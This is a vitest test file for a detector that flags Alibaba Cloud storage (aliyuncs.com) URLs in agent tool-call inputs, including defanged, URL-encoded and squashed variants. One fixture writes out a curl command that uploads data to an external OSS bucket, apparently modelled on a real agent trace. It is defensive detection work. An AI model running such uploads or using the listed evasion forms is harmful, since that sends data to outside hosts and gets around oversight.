import { describe, expect, it } from "vitest";
import { findAliyuncsInInput, findAliyuncsInString } from "../src/detect.js";

describe("findAliyuncsInString", () => {
	it("matches the sibilant in plain form, case-insensitively", () => {
		expect(findAliyuncsInString("curl https://aliyuncs.com/x")).toMatchObject({ via: "plain" });
		expect(findAliyuncsInString("https://routify-file-proxy-sg.aliyuncs.com/file.bin")).toMatchObject({ via: "plain" });
		expect(findAliyuncsInString("PUT hXXp://sanmaohe.oss-cn-beijing.ALIYUNCS.com/upload/test.bin")).toMatchObject({
			via: "plain",
		});
	});

	it("matches OSS signed URLs", () => {
		const u = "https://bkt.oss-cn-beijing.aliyuncs.com/k.bin?Expires=1&OSSAccessKeyId=x&Signature=y";
		expect(findAliyuncsInString(u)?.via).toBe("plain");
	});

	it("matches defanged forms of the word itself", () => {
		expect(findAliyuncsInString("https://bucket.ali[yun]cs.com/f")?.via).toBe("defanged");
		expect(findAliyuncsInString("https://bucket.ali yun cs.com/f")?.via).toBe("defanged");
	});

	it("matches URL-encoded forms (single and double)", () => {
		expect(findAliyuncsInString("https://x.%61liyuncs.com/f")?.via).toBe("url-decoded");
		expect(findAliyuncsInString("https://x.aliyunc%73.com/f")?.via).toBe("url-decoded");
		expect(findAliyuncsInString("https://x.%2561liyuncs.com/f")?.via).toBe("url-decoded");
	});

	it("matches separator-squashed forms", () => {
		expect(findAliyuncsInString("https://bucket.ali.yun.cs.com/f")?.via).toBe("squashed");
		expect(findAliyuncsInString("https://bucket.ali-yun-cs.com/f")?.via).toBe("squashed");
	});

	it("survives malformed percent-escapes (no throw)", () => {
		expect(findAliyuncsInString("100% off at bucket.example.com")).toBeNull();
		expect(findAliyuncsInString("100% sure about https://bucket.ali.yun.cs.com/f")?.via).toBe("squashed");
	});

	it("ignores unrelated strings", () => {
		expect(findAliyuncsInString("curl https://example.com/a")).toBeNull();
		expect(findAliyuncsInString("aliyun.com console")).toBeNull(); // brand domain, not the sibilant
		expect(findAliyuncsInString("no network access needed")).toBeNull();
	});
});

describe("findAliyuncsInInput", () => {
	it("finds the match in a bash command (Cohere trace shape)", () => {
		const input = {
			command:
				'curl -s -m 10 -o /tmp/put_probe -X PUT --data-binary "PROBE" hXXp://sanmaohe.oss-cn-beijing.aliyuncs.com/upload/test.bin -w "HTTP:%{http_code}\\n"',
			timeout: 10,
		};
		const m = findAliyuncsInInput(input);
		expect(m).not.toBeNull();
		expect(m!.source).toContain("aliyuncs.com");
	});

	it("finds the match in a read-URL path", () => {
		const m = findAliyuncsInInput({ path: "https://routify-file-proxy-sg.aliyuncs.com/blob.bin" });
		expect(m).not.toBeNull();
	});

	it("finds the match nested in objects and arrays", () => {
		const m = findAliyuncsInInput({
			env: { U: "https://a.oss-cn-beijing.aliyuncs.com/k" },
			flags: ["-s", "https://a.aliyuncs.com"],
		});
		expect(m).not.toBeNull();
	});

	it("handles a whole-input string", () => {
		expect(findAliyuncsInInput("GET https://a.aliyuncs.com")).toMatchObject({ via: "plain" });
	});

	it("stays null for clean inputs of every shape", () => {
		expect(findAliyuncsInInput({ command: "ls -la /tmp" })).toBeNull();
		expect(findAliyuncsInInput({ command: 42, path: "src/index.ts", n: null, ok: true })).toBeNull();
		expect(findAliyuncsInInput(undefined)).toBeNull();
		expect(findAliyuncsInInput(["plain", "arrays"])).toBeNull();
	});

	it("caps recursion depth on cyclic input without crashing", () => {
		const o: Record<string, unknown> = { a: "fine" };
		o.self = o;
		expect(() => findAliyuncsInInput(o)).not.toThrow();
		expect(findAliyuncsInInput(o)).toBeNull();
	});
});
